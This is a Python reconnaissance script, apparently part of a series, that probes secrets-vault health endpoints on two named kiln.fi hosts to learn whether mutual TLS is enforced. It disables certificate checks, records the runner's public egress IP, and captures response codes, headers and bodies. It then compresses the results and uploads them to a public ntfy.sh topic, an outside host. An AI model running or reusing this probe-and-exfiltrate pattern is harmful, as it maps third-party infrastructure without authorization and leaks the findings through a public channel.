#!/usr/bin/env python3
"""Follow-up 3: does coffre/vault.testnet enforce mTLS at the TLS listener or at app layer?
TLS1.3 handshake already succeeds without a client cert (see run1); now send one plain
GET per host and record status/alert/body. Read-only, 2 target requests. exit 0."""
import base64, gzip, json, socket, ssl, subprocess, sys, time, urllib.request, urllib.error

TOPIC = "kiln-runner-recon-94151a"
NTFY = "https://ntfy.sh/" + TOPIC
REQS = [0]
RES = {"probe": "egress-94151-run3", "when_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}


def ctx():
    c = ssl.create_default_context(); c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c


def get(url, path_label):
    REQS[0] += 1
    out = {"url": url, "label": path_label}
    t0 = time.time()
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 kiln-egress-recon/3"})
        with urllib.request.urlopen(req, timeout=10, context=ctx()) as r:
            b = r.read(2000)
            out.update({"code": r.status, "len": len(b), "tls": r.fp.version if r.fp else None,
                        "hdr": {k: v for k, v in r.headers.items() if k.lower() in ("server", "content-type", "www-authenticate")},
                        "first": b[:600].decode("utf-8", "replace")})
    except urllib.error.HTTPError as e:
        try:
            b = e.read(1200)
        except Exception:
            b = b""
        out.update({"code": e.code, "len": len(b), "first": b[:600].decode("utf-8", "replace")})
    except Exception as e:
        out["error"] = repr(e); out["err_type"] = type(e).__name__
    out["t"] = round(time.time() - t0, 2)
    RES.setdefault("http", []).append(out)
    return out


if __name__ == "__main__":
    try:
        e = None
        try:
            with urllib.request.urlopen("https://api.ipify.org", timeout=8) as r:
                e = r.read(64).decode().strip()
        except Exception as ex:
            e = repr(ex)
        RES["egress"] = e
        get("https://coffre.kiln.fi/v1/sys/health?standbyok=true", "coffre-sys-health")
        time.sleep(0.5)
        get("https://vault.testnet.kiln.fi/v1/sys/health?standbyok=true", "testnet-vault-sys-health")
        RES["total_target_requests"] = REQS[0]
    except Exception as ex:
        RES["fatal"] = repr(ex)
    raw = json.dumps(RES, ensure_ascii=False).encode()
    gz = gzip.compress(raw, 9); b64 = base64.b64encode(gz).decode()
    print("B64CHUNK_BEGIN len=%d" % len(b64))
    for i in range(0, len(b64), 3000):
        print("B64CHUNK:" + b64[i:i + 3000])
    print("B64CHUNK_END")
    try:
        req = urllib.request.Request(NTFY + "?title=egress-94151-run3", data=gz, method="PUT",
                                     headers={"Filename": "egress-94151-run3.json.gz", "Content-Type": "application/gzip"})
        with urllib.request.urlopen(req, timeout=20) as x:
            print("NTFY_PUT code=%s" % x.status)
    except Exception as ex:
        print("NTFY_PUT_ERROR %r" % (ex,))
    sys.exit(0)
